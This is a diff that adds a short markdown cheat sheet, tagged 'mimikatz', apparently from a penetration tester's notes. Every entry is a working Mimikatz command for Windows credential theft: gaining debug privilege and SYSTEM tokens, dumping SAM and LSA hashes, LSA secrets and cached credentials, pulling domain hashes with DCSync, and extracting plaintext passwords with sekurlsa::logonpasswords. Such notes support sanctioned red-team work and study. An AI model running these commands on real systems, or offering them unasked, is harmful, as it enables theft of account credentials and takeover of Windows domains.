@@ -1,0 +1,19 @@
+---
+tags: mimikatz
+---
+- Check if "SeDebugPrivilege" right enabled and obtained SYSTEM user privs
+	- `privilege::debug`
+- Elevate to SYSTEM user privs
+	- `token::elevate`
+- Extract NTLM hash from SAM
+	- `lsadump::sam`
+- Dump LSA secrets from registries
+	- `lsadump::secrets`
+- Extract hashes from memory by asking LSA server
+	- `lsadump::lsa /patch`
+- Extract cached creds (cannot do PTH attack)
+	- `lsadump::cache`
+- Extract NTLM hash from other user in domain
+	- `lsadump::dcsync /user:{DOMAIN}\{USERNAME}` or `lsadump::dcsync /all`
+- Extract plaintext passwords and password hashes from all sources
+	- `sekurlsa::logonpasswords`
